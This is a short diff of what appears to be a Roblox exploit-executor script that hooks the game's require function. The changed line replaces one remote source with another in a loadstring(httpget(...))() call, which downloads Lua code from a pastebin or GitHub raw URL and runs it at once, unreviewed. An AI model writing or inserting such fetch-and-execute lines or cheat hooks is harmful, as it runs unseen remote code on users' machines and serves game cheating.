@@ -69,7 +69,7 @@ getgenv().require = newcclosure(function(v)
     end
 end)
 
-loadstring(httpget("https://pastebin.com/raw/Nnt3hjs3"))()
+loadstring(httpget("https://raw.githubusercontent.com/Iamomarg/verycoolkaka/refs/heads/main/kaka/wow.luau"))()
 
 local RunService = game:GetService("RunService")
 RunService.Heartbeat:Connect(function()
